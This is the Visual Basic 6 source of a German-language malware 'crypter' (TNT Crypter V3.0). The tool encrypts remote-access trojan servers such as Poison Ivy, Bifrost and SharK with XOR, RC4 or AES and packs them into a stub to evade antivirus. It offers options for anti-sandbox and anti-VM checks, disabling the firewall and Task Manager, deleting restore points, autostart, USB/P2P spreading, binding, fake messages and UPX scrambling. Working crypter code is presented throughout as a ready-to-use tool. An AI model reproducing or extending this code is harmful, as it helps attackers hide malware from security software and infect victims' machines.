VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frm_main 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "TNT - Crypter V3.0 - [USERNAME] by root"
   ClientHeight    =   13275
   ClientLeft      =   720
   ClientTop       =   990
   ClientWidth     =   8955
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   13275
   ScaleWidth      =   8955
   ShowInTaskbar   =   0   'False
   Begin VB.Frame Frame60 
      Caption         =   "Parameter"
      Height          =   1215
      Left            =   120
      TabIndex        =   60
      Top             =   11160
      Width           =   5775
      Begin VB.TextBox txtParams 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   62
         Top             =   720
         Width           =   5415
      End
      Begin VB.CheckBox Check13 
         Caption         =   "Enable Parameter Support"
         Height          =   255
         Left            =   120
         TabIndex        =   61
         Top             =   360
         Width           =   2415
      End
      Begin VB.Label Label2 
         Caption         =   "Z.b. bei Nirsoft Tools"
         Height          =   255
         Left            =   2640
         TabIndex        =   65
         Top             =   360
         Width           =   2295
      End
   End
   Begin VB.PictureBox Picture2 
      BorderStyle     =   0  'Kein
      Height          =   1215
      Left            =   0
      Picture         =   "Form1.frx":57E2
      ScaleHeight     =   1215
      ScaleWidth      =   9015
      TabIndex        =   52
      Top             =   0
      Width           =   9015
   End
   Begin VB.Frame Frame11 
      Caption         =   "Verschlüsslung"
      Height          =   1455
      Left            =   120
      TabIndex        =   47
      Top             =   9600
      Width           =   5775
      Begin VB.OptionButton Crypt_option 
         Caption         =   "RC4  z.b. für Sattelite Stealer"
         Height          =   195
         Index           =   1
         Left            =   240
         TabIndex        =   50
         Top             =   360
         Width           =   3375
      End
      Begin VB.OptionButton Crypt_option 
         Caption         =   "AES z.b. für alles"
         Height          =   195
         Index           =   2
         Left            =   240
         TabIndex        =   49
         Top             =   1080
         Width           =   1815
      End
      Begin VB.OptionButton Crypt_option 
         Caption         =   "XOR  z.b. für Poison Ivy"
         Height          =   195
         Index           =   0
         Left            =   240
         TabIndex        =   48
         Top             =   720
         Width           =   2055
      End
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   6240
      Top             =   600
   End
   Begin VB.Frame Frame12 
      Height          =   735
      Left            =   120
      TabIndex        =   43
      Top             =   12480
      Width           =   8775
      Begin VB.Label Label4 
         Alignment       =   2  'Zentriert
         Height          =   255
         Left            =   120
         TabIndex        =   44
         Top             =   240
         Width           =   8535
      End
   End
   Begin MSComDlg.CommonDialog cdl 
      Left            =   1320
      Top             =   480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   120
      Top             =   480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame6 
      Caption         =   "Icon Changer"
      Height          =   1215
      Left            =   120
      TabIndex        =   31
      Top             =   4680
      Width           =   5775
      Begin VB.TextBox ico 
         Enabled         =   0   'False
         Height          =   285
         Left            =   720
         TabIndex        =   35
         Top             =   720
         Width           =   3735
      End
      Begin VB.CheckBox Check2 
         Caption         =   "Icon Changer Aktivieren"
         Height          =   255
         Left            =   720
         TabIndex        =   34
         Top             =   360
         Width           =   2295
      End
      Begin VB.PictureBox Picture1 
         Height          =   495
         Left            =   120
         ScaleHeight     =   435
         ScaleWidth      =   435
         TabIndex        =   33
         Top             =   360
         Width           =   495
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Browse"
         Enabled         =   0   'False
         Height          =   255
         Left            =   4560
         TabIndex        =   32
         Top             =   720
         Width           =   1095
      End
   End
   Begin VB.Frame Frame10 
      Caption         =   "Crypt"
      Height          =   1935
      Left            =   6000
      TabIndex        =   28
      Top             =   10440
      Width           =   2895
      Begin VB.CommandButton Command3 
         Caption         =   "Exit"
         Height          =   375
         Left            =   120
         TabIndex        =   42
         Top             =   1200
         Width           =   2655
      End
      Begin VB.CommandButton cmd_crypt 
         Caption         =   "Crypt!"
         Height          =   375
         Left            =   1560
         TabIndex        =   30
         Top             =   480
         Width           =   1215
      End
      Begin VB.CommandButton cmd_about 
         Caption         =   "About"
         Height          =   375
         Left            =   120
         TabIndex        =   29
         Top             =   480
         Width           =   1215
      End
   End
   Begin VB.Frame Frame8 
      Caption         =   "Change Stub"
      Height          =   1215
      Left            =   120
      TabIndex        =   25
      Top             =   3360
      Width           =   5775
      Begin VB.CheckBox Check20 
         Caption         =   "Use custom Stub"
         Height          =   255
         Left            =   120
         TabIndex        =   63
         Top             =   360
         Width           =   1575
      End
      Begin MSComDlg.CommonDialog Comdlg_custom 
         Left            =   4200
         Top             =   240
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Browse"
         Enabled         =   0   'False
         Height          =   255
         Left            =   4560
         TabIndex        =   27
         Top             =   720
         Width           =   1095
      End
      Begin VB.TextBox Text10 
         BackColor       =   &H80000004&
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   26
         Text            =   "Select a custom Stub"
         Top             =   720
         Width           =   4125
      End
   End
   Begin MSComDlg.CommonDialog cdl3 
      Left            =   1800
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdl2 
      Left            =   960
      Top             =   360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame7 
      Caption         =   "Binder"
      Height          =   1335
      Left            =   120
      TabIndex        =   21
      Top             =   8160
      Width           =   5775
      Begin VB.CheckBox Check1 
         Caption         =   "Binder Aktivieren"
         Height          =   195
         Left            =   120
         TabIndex        =   24
         Top             =   300
         Width           =   1935
      End
      Begin VB.CommandButton cmd_bind 
         Caption         =   "Browse"
         Enabled         =   0   'False
         Height          =   255
         Left            =   4560
         TabIndex        =   23
         Top             =   640
         Width           =   1095
      End
      Begin VB.TextBox txt_bind 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   22
         Text            =   "Pfad..."
         Top             =   640
         Width           =   4215
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Verschlüsselungs String"
      Height          =   735
      Left            =   120
      TabIndex        =   16
      Top             =   2520
      Width           =   5775
      Begin VB.TextBox txtKey 
         Height          =   285
         Left            =   120
         TabIndex        =   20
         Top             =   300
         Width           =   3135
      End
      Begin VB.CommandButton cmd_generieren 
         Caption         =   "Generieren"
         Height          =   255
         Left            =   4560
         TabIndex        =   19
         Top             =   300
         Width           =   1095
      End
      Begin VB.HScrollBar scroll 
         Height          =   255
         Left            =   3960
         TabIndex        =   18
         Top             =   300
         Width           =   375
      End
      Begin VB.TextBox txtkeylaenge 
         Enabled         =   0   'False
         Height          =   285
         Left            =   3360
         TabIndex        =   17
         Text            =   "20"
         Top             =   300
         Width           =   495
      End
   End
   Begin VB.Frame Frame5 
      Caption         =   "Exe Vergrößern (Exe Pump)"
      Height          =   1695
      Left            =   6000
      TabIndex        =   12
      Top             =   8640
      Width           =   2895
      Begin VB.CheckBox chkpump 
         Caption         =   "Exe-Pump Aktivieren"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   350
         Width           =   2055
      End
      Begin VB.TextBox txtKb 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   13
         Text            =   "0"
         Top             =   720
         Width           =   1455
      End
      Begin VB.Label Label1 
         Caption         =   "1024 KB ~ 1 MB"
         Height          =   255
         Left            =   120
         TabIndex        =   53
         Top             =   1200
         Width           =   2415
      End
      Begin VB.Label Label3 
         Caption         =   "Kilo Bytes"
         Height          =   255
         Left            =   1680
         TabIndex        =   15
         Top             =   720
         Width           =   855
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "Fake Message"
      Height          =   2055
      Left            =   120
      TabIndex        =   9
      Top             =   6000
      Width           =   5775
      Begin VB.ComboBox Combo1 
         Enabled         =   0   'False
         Height          =   315
         ItemData        =   "Form1.frx":7DA38
         Left            =   120
         List            =   "Form1.frx":7DA45
         TabIndex        =   46
         Text            =   "Bitte auswählen"
         Top             =   1560
         Width           =   2655
      End
      Begin VB.TextBox Text1 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   45
         Text            =   "Titel"
         Top             =   840
         Width           =   5415
      End
      Begin VB.CheckBox chkfake 
         Caption         =   "Fake Message Aktivieren"
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   360
         Width           =   2175
      End
      Begin VB.TextBox txtMsg 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   10
         Text            =   "Message"
         Top             =   1200
         Width           =   5415
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Options"
      Height          =   7215
      Left            =   6000
      TabIndex        =   3
      Top             =   1320
      Width           =   2895
      Begin VB.CheckBox check50 
         Caption         =   "Anti Debug"
         Height          =   195
         Left            =   120
         TabIndex        =   64
         Top             =   6840
         Width           =   1695
      End
      Begin VB.CheckBox Check4 
         Caption         =   "P2P/USB Spread"
         Height          =   195
         Left            =   120
         TabIndex        =   59
         Top             =   5400
         Width           =   1695
      End
      Begin VB.CheckBox Check19 
         Caption         =   "Hide Proccess (XP)"
         Height          =   195
         Left            =   120
         TabIndex        =   58
         Top             =   5040
         Width           =   1695
      End
      Begin VB.CheckBox Check21 
         Caption         =   "Proactive Bypass"
         Height          =   195
         Left            =   120
         TabIndex        =   57
         Top             =   4680
         Width           =   1815
      End
      Begin VB.CheckBox Check22 
         Caption         =   "Scramble UPX"
         Height          =   195
         Left            =   120
         TabIndex        =   56
         Top             =   4320
         Width           =   1695
      End
      Begin VB.CheckBox Check18 
         Caption         =   "Delete Restore Points"
         Height          =   195
         Left            =   120
         TabIndex        =   55
         Top             =   3960
         Width           =   1935
      End
      Begin VB.CheckBox Check17 
         Caption         =   "Autostart"
         Height          =   195
         Left            =   120
         TabIndex        =   54
         Top             =   3600
         Width           =   1095
      End
      Begin VB.CheckBox Check3 
         Caption         =   "Realign PE Header"
         Height          =   195
         Left            =   120
         TabIndex        =   51
         Top             =   3240
         Width           =   2295
      End
      Begin VB.CheckBox ch_sunbelt 
         Caption         =   "Anti Sunbelt"
         Height          =   195
         Left            =   120
         TabIndex        =   41
         Top             =   360
         Width           =   1365
      End
      Begin VB.CheckBox ch_kav 
         Caption         =   "Anti Kaspersky"
         Height          =   195
         Left            =   120
         TabIndex        =   40
         Top             =   1800
         Width           =   1365
      End
      Begin VB.CheckBox ch_CW 
         Caption         =   "Anti CW Sandbox"
         Height          =   195
         Left            =   120
         TabIndex        =   39
         Top             =   1440
         Width           =   1770
      End
      Begin VB.CheckBox ch_Norman 
         Caption         =   "Anti Norman Sandbox"
         Height          =   195
         Left            =   120
         TabIndex        =   38
         Top             =   5760
         Width           =   1905
      End
      Begin VB.CheckBox ch_anubis 
         Caption         =   "Anti Anubis"
         Height          =   195
         Left            =   120
         TabIndex        =   37
         Top             =   6480
         Width           =   1095
      End
      Begin VB.CheckBox ch_pack 
         Caption         =   "Pack File with UPX"
         Height          =   195
         Left            =   120
         TabIndex        =   36
         Top             =   2880
         Width           =   1695
      End
      Begin VB.CheckBox chkmelt 
         Caption         =   "Melt Server"
         Height          =   195
         Left            =   120
         TabIndex        =   8
         Top             =   2160
         Width           =   1215
      End
      Begin VB.CheckBox dsbFW 
         Caption         =   "Disable Firewall"
         Height          =   195
         Left            =   120
         TabIndex        =   7
         Top             =   2520
         Width           =   1575
      End
      Begin VB.CheckBox dsbTsk 
         Caption         =   "Disable Taskmanager"
         ForeColor       =   &H00000000&
         Height          =   195
         Left            =   120
         TabIndex        =   6
         Top             =   6120
         Width           =   1935
      End
      Begin VB.CheckBox chkVm 
         Caption         =   "Anti Vmware / Virtual PC"
         Height          =   195
         Left            =   120
         TabIndex        =   5
         Top             =   720
         Width           =   2055
      End
      Begin VB.CheckBox chkSand 
         Caption         =   "Anti Sandbox"
         Height          =   195
         Left            =   120
         TabIndex        =   4
         Top             =   1080
         Width           =   1335
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Wähle das zu cryptende File"
      Height          =   1095
      Left            =   120
      TabIndex        =   0
      Top             =   1320
      Width           =   5775
      Begin VB.CommandButton cmd_browse 
         BackColor       =   &H0000C0C0&
         Caption         =   "Browse"
         Height          =   255
         Left            =   4560
         TabIndex        =   2
         Top             =   360
         Width           =   1095
      End
      Begin VB.TextBox txt_Pfad 
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   1
         Text            =   "Pfad..."
         Top             =   360
         Width           =   4335
      End
   End
End
Attribute VB_Name = "frm_main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Option Explicit

Private Declare Function ReleaseCapture Lib "user32" () As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetInputState Lib "user32" () As Long
                
Private Declare Function GetDiskFreeSpace Lib "kernel32" _
  Alias "GetDiskFreeSpaceA" ( _
  ByVal lpRootPathName As String, _
  lpSectorsPerCluster As Long, _
  lpBytesPerSector As Long, _
  lpNumberOfFreeClusters As Long, _
  lpTotalNumberOfClusters As Long) As Long
  
Const FileEnde = "|#<ende>#|"
Const kleinbuchstaben = "abcdefghijklmnopqrstuvwxyz"
Const großbuchstaben = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const zahlen = "1234567890"

Private iEndFileSize As Long

Function FileInfo(ByVal FFile As String)
Dim ForSize As String
Dim sstub As String
Dim hallo As String
Dim proz As Integer
Dim Finfo(0 To 100) As Double



Open FFile For Binary As #1
    ForSize = Space$(LOF(1))
    Get #1, , ForSize
Close #1

Open App.Path & "\stub.exe" For Binary As #1
sstub = Space(LOF(1))
Get #1, , sstub
Close #1




Finfo(0) = InStr(ForSize, "s3|Fs|gFs[N;sÛœHsÄ¨Hs ÁGsGÂGscGsÄåFsÜŽ;sãÒGs]ðHsT&Gs½;GsibGsn‚;s`Gs™W;s;fGsž8Gs|æFsDQ;sgéFs>Þ9s<”HsÈFsSH;sñI;")
Finfo(1) = InStr(ForSize, "sharK 3")
Finfo(2) = InStr(ForSize, "½ËÚùn¥‰ùn¥‰ùn¥‰wq¶‰ýn¥‰N·‰øn¥‰Richùn¥‰")
Finfo(3) = InStr(ForSize, "ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØûûüÒöööööööÛí!")
Finfo(4) = InStr(ForSize, "233$363S34N5p5Ç5Ó5Ú5ì5þ5\6²6â6ý67")

If Finfo(0) <> 0 Then
MsgBox "Selected File is a SharK 2 Server!", vbInformation, "Info"
SharK2 = True
End If

If Finfo(1) <> 0 Then
MsgBox "Selected File is a SharK 3 Server!", vbInformation, "Info"
SharK3 = True
End If

If Finfo(2) <> 0 Then
MsgBox "Selected File is a Poisen Ivy Server!", vbInformation, "Info"
PI = True
End If

If Finfo(3) <> 0 Then
MsgBox "Selected File is a Bifrost Server!", vbInformation, "Info"
Bifrost = True
End If

If Finfo(4) <> 0 Then
MsgBox "Selected File is a Satelite 4600 Server!", vbInformation, "Info"
Bifrost = True
End If

End Function


        


Public Function XOREncryption(CodeKey As String, DataIn As String) As String
On Error Resume Next
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim Temp As Integer
    Dim tempstring As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    Dim iLen As Long
    
    iLen = Len(DataIn)
    
    For lonDataPtr = 1 To iLen
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        'The second value comes from the code key
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        Temp = (intXOrValue1 Xor intXOrValue2)
        tempstring = Hex(Temp)
        If Len(tempstring) = 1 Then tempstring = "0" & tempstring
        
        strDataOut = strDataOut + tempstring
        MyDoEvents
    Next lonDataPtr
   XOREncryption = strDataOut

End Function

Public Sub MyDoEvents()
Static xCount As Integer
If GetInputState() Then
 DoEvents
ElseIf xCount = 10 Then
 DoEvents
 xCount = 0
Else
 xCount = xCount + 1
End If
End Sub


Private Function GetNullBytes(lNum) As String
    Dim sBuf As String
    Dim i As Integer
    For i = 1 To lNum
        sBuf = sBuf & Chr(0)
    Next
    
    GetNullBytes = sBuf
End Function




Private Sub Check1_Click()

If txt_bind.Enabled = True Then
    txt_bind.Enabled = False
    cmd_bind.Enabled = False
    Else
    txt_bind.Enabled = True
    cmd_bind.Enabled = True
End If

End Sub



Private Sub Check13_Click()
If txtParams.Enabled = True Then
txtParams.Enabled = False

Else
txtParams.Enabled = True

End If
End Sub

Private Sub Check2_Click()
If Check2.Value = 1 Then
    ico.Enabled = True
    Command2.Enabled = True
Else
    ico.Enabled = False
    Command2.Enabled = False
End If
End Sub

Private Sub Check20_Click()
If Check20.Value = 1 Then
    Text10.Enabled = True
    Command1.Enabled = True
Else
    Text10.Enabled = False
    Command1.Enabled = False
End If
End Sub



Private Sub chkfake_Click()
If chkfake.Value = 1 Then
Text1.Enabled = True
 txtMsg.Enabled = True
   Combo1.Enabled = True
   Else
   
   If chkfake.Value = 0 Then
    Text1.Enabled = False
     txtMsg.Enabled = False
     Combo1.Enabled = False
   

End If
End If


End Sub



Private Sub chkpump_Click()

If txtKb.Enabled = True Then
    txtKb.Enabled = False
    Else: txtKb.Enabled = True
End If

End Sub

Private Sub cmd_about_Click()
MsgBox ("Codet by root Copyright by Me ")
End Sub

Private Sub cmd_bind_Click()

With cdl3
    .Filter = "Executables (*.exe*) | *.exe*"
    .ShowOpen
End With

txt_bind.Text = cdl3.FileName

End Sub

Private Sub cmd_browse_Click()

With cdl
    .Filter = "Executables (*.exe*) | *.exe*"
    .ShowOpen
End With


txt_Pfad.Text = cdl.FileName

If txt_Pfad.Text = "" Then
    MsgBox ("Bitte wählen Sie ein File aus!"), vbInformation, "Information"
  Exit Sub
Else

FileInfo (txt_Pfad.Text)
Call GetEndFileSize

 End If
End Sub

Private Sub cmd_crypt_Click()
Dim Pfad As String



If txt_Pfad.Text = "" Or txt_Pfad.Text = "Path..." Then
    MsgBox ("Bitte wählen Sie ein File aus!"), vbInformation, "Information"
    Exit Sub
End If

With cdl2
  .Filter = "Executable Files (*.exe) | *.exe"
.FileName = ""
.ShowSave

    
Pfad = cdl2.FileName

DoEvents

If Pfad = "" Then
Exit Sub
End If




End With



Dim sstub As String
Dim stubpath As String

If Check20.Value = 1 Then
    stubpath = Comdlg_custom.FileName
Else
    stubpath = App.Path & "\stub.exe"
End If



'Stub einlesen
Open stubpath For Binary As #1
    sstub = Space(LOF(1))
    Get #1, , sstub
Close #1

'Überprüfen welche Verschlüsselung gewählt wurde
If Crypt_option(0).Value Or Crypt_option(1).Value Then
 'XOR und RC4
 'Server wird eingelesen
 Dim server As String
 Dim cServer As String
 
 Open txt_Pfad.Text For Binary As #1
  server = Space(LOF(1))
  Get #1, , server
 Close #1
 
 If Crypt_option(0).Value Then
  'XOR
  cServer = XOREncryption(txtKey.Text, server)
 Else
  'RC4
  'Server verschlüsseln
  cServer = RC4(server, txtKey.Text)
 End If
 
ElseIf Crypt_option(2).Value Then
 'AES
 'Server wird eingelesen als ByteArray
 Dim bServer() As Byte
 Dim bCServer() As Byte
 
 Open txt_Pfad.Text For Binary As #1
 ReDim bServer(LOF(1))
 Get #1, , bServer
 Close #1
 
 'Server verschlüsseln
 Call AES_EncryptFile(bServer, bCServer, txtKey.Text)
 
Else
 Exit Sub
End If



Dim Options As String

    Options = "/(t78/(t/Z()/(z789Z)" & chkfake.Value & "/(t78/(t/Z()/(z789Z)" & txtMsg.Text & "/(t78/(t/Z()/(z789Z)" & txtKey.Text & "/(t78/(t/Z()/(z789Z)" & chkmelt.Value & "/(t78/(t/Z()/(z789Z)" & chkVm.Value & "/(t78/(t/Z()/(z789Z)" & chkSand.Value & "/(t78/(t/Z()/(z789Z)" & dsbTsk.Value & "/(t78/(t/Z()/(z789Z)" & dsbFW.Value & "/(t78/(t/Z()/(z789Z)" & Check1.Value & "/(t78/(t/Z()/(z789Z)" & ch_anubis.Value & "/(t78/(t/Z()/(z789Z)" & ch_Norman.Value & "/(t78/(t/Z()/(z789Z)" & ch_CW.Value & "/(t78/(t/Z()/(z789Z)" & ch_kav.Value & "/(t78/(t/Z()/(z789Z)" & ch_sunbelt.Value & "/(t78/(t/Z()/(z789Z)" & Text1.Text & "/(t78/(t/Z()/(z789Z)" & Combo1.Text & "/(t78/(t/Z()/(z789Z)" & Check13.Value & "/(t78/(t/Z()/(z789Z)" & txtParams.Text & "/(t78/(t/Z()/(z789Z)" & Check19.Value & "/(t78/(t/Z()/(z789Z)" & Check21.Value & "/(t78/(t/Z()/(z789Z)" & Check18.Value & "/(t78/(t/Z()/(z789Z)" & Check17.Value & "/(t78/(t/Z()/(z789Z)" & check50.Value & "/(t78/(t/Z()/(z789Z)" & Check4.Value & "/(t78/(t/Z()/(z789Z)"
    If Crypt_option(0).Value = True Then
     Options = Options & "0" & "/(t78/(t/Z()/(z789Z)"
    ElseIf Crypt_option(1).Value = True Then
     Options = Options & "1" & "/(t78/(t/Z()/(z789Z)"
     Else
     Options = Options & "2" & "/(t78/(t/Z()/(z789Z)"
    End If
  
    'Datei öffnen
    Open cdl2.FileName For Binary As #1
    Put #1, , sstub & FileEnde
    
    If Crypt_option(0).Value Or Crypt_option(1).Value Then
     'XOR und RC4
     Put #1, , cServer & FileEnde
    
    ElseIf Crypt_option(2).Value Then
     'AES
     Put #1, , bCServer
     Put #1, , FileEnde
    End If
  
    'Options anhängen
    Put #1, , XOREncryption("Baldbekommeichmeinlaptop", Options)
    
    
    If chkpump.Value = 1 Then
Dim pump As String
Dim kbstring As String
Dim i As Integer
kbstring = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        "
For i = 0 To txtKb.Text
pump = pump & kbstring
Next i
Put #1, LOF(1) + 1, pump
Close #1
 End If
    
 

    If Check1.Value = "1" Then
        Open txt_bind.Text For Binary As #1
            Dim binded As String
            binded = Space(LOF(1))
            Get #1, , binded
        Close #1
        
        Open cdl2.FileName & ".exe" For Binary As #1
            Put #1, LOF(1) + 1, binded
        Close #1
    End If
    
    If ch_pack.Value = 1 Then
     Dim Buffer() As Byte
     Buffer = LoadResData(101, "CUSTOM")
     Open "C:\upx.exe" For Binary As #1
     Put #1, , Buffer
     Close #1
Call ShellExecute(Me.hWnd, "open", "C:\upx.exe ", cdl2.FileName, vbNullString, 0)
End If
    
    
    
    

Pfad = cdl2.FileName

If Check2.Value = 1 Then
Call ReplaceIcons(ico.Text, Pfad, Err)
End If

If Check3.Value = 1 Then
pathEOF (cdl2.FileName)
End If

If Check22.Value = 1 Then
Dim sFile As String, iPos As Long

Open cdl2.FileName For Binary As #1
sFile = Space(LOF(1))
Get #1, , sFile
Close #1

iPos = InStr(1, sFile, "UPX")
sFile = Left(sFile, iPos - 1) + Chr(0) + Chr(0) + Chr(0) + Chr(0) + Right(sFile, Len(sFile) - iPos - 3)
iPos = InStr(1, sFile, "UPX")
sFile = Left(sFile, iPos - 1) + Chr(0) + Chr(0) + Chr(0) + Chr(0) + Right(sFile, Len(sFile) - iPos - 3)

cdl2.ShowSave

Open cdl2.FileName For Binary As #1
Put #1, , sFile
Close #1
End If











ende:

MsgBox ("File Crypted!"), vbInformation, "Finished"


End Sub

Sub GetCPUData()

  Dim objCPUItem As Object, objCPU As Object

  On Error Resume Next
  Set objCPUItem = _
        GetObject("winmgmts:").InstancesOf("Win32_Processor")

  If Err.Number = 0 Then
    

    For Each objCPU In objCPUItem
   CpuName = Trim$(objCPU.Name)
      cpuid = objCPU.ProcessorId
      
    Next

    Set objCPUItem = Nothing
  End If
  On Error GoTo 0
End Sub

Public Function DiskTotalSpace(ByVal sDisk As String, _
  Optional ByVal bGB As Boolean = False, _
  Optional ByVal bRound As Boolean = False) As Currency
 
  ' Variablen
  Dim fRegular As Long
  Dim fDrive As String
  Dim fSectorsPerCluster As Long
  Dim fBytesPerSector As Long
  Dim fFreeClusters As Long
  Dim fTotalClusters As Long
  Dim fMBytesPerCluster As Currency
 
  ' Laufwerk korrekt einstellen
  ChDrive Left$(sDisk, 2)
 
  ' Daten holen
  fRegular = GetDiskFreeSpace(fDrive, fSectorsPerCluster, _
    fBytesPerSector, fFreeClusters, fTotalClusters)
 
  ' daten auswerten
  If fRegular <> 0 Then
    ' Berechnen, wieviel Megabyte pro Cluster gespeichert sind
    fMBytesPerCluster = ((fBytesPerSector * fSectorsPerCluster) / 1048576)
    If bGB = True Then
      ' Gesamtspeicherplatz in Gigabyte ausgeben
      DiskTotalSpace = ((fTotalClusters * fMBytesPerCluster) / 1024)
    Else
      ' Gesamtspeicherplatz in Megabyte ausgeben
      DiskTotalSpace = (fTotalClusters * fMBytesPerCluster)
    End If
 
    ' Runden?
    If bRound Then DiskTotalSpace = Int(DiskTotalSpace)
  Else
    DiskTotalSpace = 0
  End If
End Function


Public Function FileExists(Path As String) As Boolean
  Const NotFile = vbDirectory Or vbVolume

  On Error Resume Next
    FileExists = (GetAttr(Path) And NotFile) = 0
  On Error GoTo 0
End Function


Private Sub cmd_generieren_Click()
Dim i As Integer

Dim zeichen As String
zeichen = ""
zeichen = kleinbuchstaben & großbuchstaben & zahlen




If Not IsNumeric(txtkeylaenge.Text) Then
    MsgBox "Bitte nur numerische Zeichen als Länge angeben!", vbCritical, "Fehler"
    Exit Sub
End If

Dim stringiling As String
stringiling = ""

txtKey.Text = ""

For i = 1 To txtkeylaenge.Text
    Randomize Timer
    Dim start As String
    start = Int((Rnd * Len(zeichen)) + 1)
    stringiling = stringiling & Mid(zeichen, start, 1)
    DoEvents
Next i

txtKey.Text = stringiling

End Sub








Private Sub Command1_Click()
On Error GoTo Err:

With Comdlg_custom
 .CancelError = True
 .Filter = "Executables (*.exe*) | *.exe*"
 .ShowOpen
 Text10.Text = Comdlg_custom.FileName
End With
Call GetEndFileSize

Err:
End Sub






Private Sub Command2_Click()
With CommonDialog1
    .Filter = "Icon Files (*.ico) | *.ico"
    .ShowOpen
    Picture1.Picture = LoadPicture(.FileName, , , 32, 32)
    ico.Text = .FileName
End With
End Sub



Private Sub Command3_Click()
End

End Sub

Private Sub Form_Load()

Crypt_option(1).Value = True
cmd_generieren_Click


End Sub

Private Sub scroll_Change()
txtkeylaenge.Text = CStr(scroll.Value)
If txtkeylaenge.Text = 27 Then scroll.Value = 1
End Sub


Private Sub Timer1_Timer()
Label4.Caption = "Date: " & Format(Now(), "dd:mm:yyyy") & "        " & "Time: " & Format(Now(), "hh:mm:ss") & "        " & "Dateigröße: " & CalculateSize(iEndFileSize)
End Sub

Public Function CalculateSize(ByVal iSize As Double) As String
On Error GoTo Err:
Dim i As Integer
Dim sArray(4) As String

sArray(0) = "Byte"
sArray(1) = "KByte"
sArray(2) = "MByte"
sArray(3) = "GByte"
sArray(4) = "TByte"

i = 0
Do Until iSize < 1024
 iSize = iSize / 1024
 i = i + 1
Loop

If StrComp(sArray(i), "Byte") = 0 Then
 CalculateSize = (Format$(iSize, "###,##")) & " " & sArray(i)
Else
 CalculateSize = (Format$(iSize, "##,0.00")) & " " & sArray(i)
End If

Exit Function
Err:
CalculateSize = vbNullString
End Function

Private Sub GetEndFileSize()
On Error Resume Next

iEndFileSize = 0

If IsFile(txt_Pfad.Text) Then iEndFileSize = iEndFileSize + (FileLen(txt_Pfad.Text))
If Check20.Value = 1 Then
 If IsFile(Text10.Text) Then iEndFileSize = iEndFileSize + (FileLen(Text10.Text))
End If

'Hier eine For Schleife.
'Mit FileLen die Größe der Dateien auslesen und zu iEndFileSize dazu addieren   aso ne frage weist du woran da sleigt wenn ich das icon der stub gechanget habe und dann crypte und nen icon auswähle hat er immer noch das von der stub. Dann hast du nen buggy code^^ ne guck
End Sub

Public Function IsFile(sFilePath As String) As Boolean
On Error Resume Next
IsFile = (GetAttr(sFilePath) And 24) = 0
End Function


